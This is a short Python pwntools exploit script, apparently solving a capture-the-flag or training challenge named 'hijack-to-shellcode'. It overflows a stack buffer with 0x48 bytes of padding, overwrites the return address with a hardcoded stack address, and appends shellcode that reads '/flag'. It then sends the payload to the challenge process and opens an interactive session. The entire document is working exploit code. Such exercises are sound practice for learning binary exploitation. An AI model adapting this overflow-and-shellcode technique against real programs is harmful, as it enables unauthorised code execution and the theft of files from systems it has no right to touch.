import sys
from pwn import *

p = process('/challenge/binary-exploitation-hijack-to-shellcode-w')
context.arch = 'amd64'

shellcode = asm(shellcraft.cat("/flag"))

payload = b"A" * 0x48
win = p64(0x00007fffffffd600)
payload += win
payload += shellcode
with open("payload_hijack2shellcode", "wb") as f:
    f.write(payload)
p.send(payload)
p.interactive()
